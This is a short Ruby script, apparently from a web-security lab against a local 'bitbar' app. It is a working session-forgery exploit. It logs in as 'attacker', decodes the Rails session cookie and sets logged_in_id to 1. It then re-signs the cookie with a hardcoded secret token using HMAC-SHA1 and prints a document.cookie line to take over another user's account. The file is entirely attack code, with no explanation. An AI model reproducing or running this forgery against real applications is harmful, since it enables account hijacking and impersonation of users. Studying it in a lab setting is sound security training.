require 'mechanize'

bitses = '_bitbar_session'
secret_token = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'

a = Mechanize.new
page = a.get 'http://localhost:3000/login'
login = page.forms.first
login['username'] = 'attacker'
login['password'] = 'attacker'
a.submit login

cookie = a.cookie_jar.jar['localhost']['/'][bitses].to_s.sub("#{bitses}=", '')
session, key = cookie.split('--')
session = Marshal.load(Base64.decode64(session))
session['logged_in_id'] = 1
session = Base64.encode64(Marshal.dump(session)).split.join
key = OpenSSL::HMAC.hexdigest(OpenSSL::Digest.const_get('SHA1').new, secret_token, session)
cookie = "#{bitses}=#{session}--#{key}"

puts "document.cookie='#{cookie}';"



